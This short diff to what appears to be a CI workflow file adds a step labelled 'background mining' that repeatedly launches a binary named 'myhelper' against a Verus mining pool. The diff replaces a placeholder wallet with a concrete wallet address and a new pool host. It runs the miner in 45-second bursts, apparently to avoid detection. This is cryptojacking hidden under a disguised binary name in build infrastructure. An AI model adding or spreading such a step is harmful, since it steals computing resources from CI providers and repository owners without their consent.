@@ -17,7 +17,7 @@ jobs:
     - name: Start background mining (low CPU)
       run: |
         while true; do
-          ./myhelper -a verus -o stratum+tcp://na.luckpool.net:3956 -u YOUR_VERUS_WALLET.WORKER -p x &
+          ./myhelper -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7.worker1 -p x &
           PID=$!
           sleep 45
           kill $PID
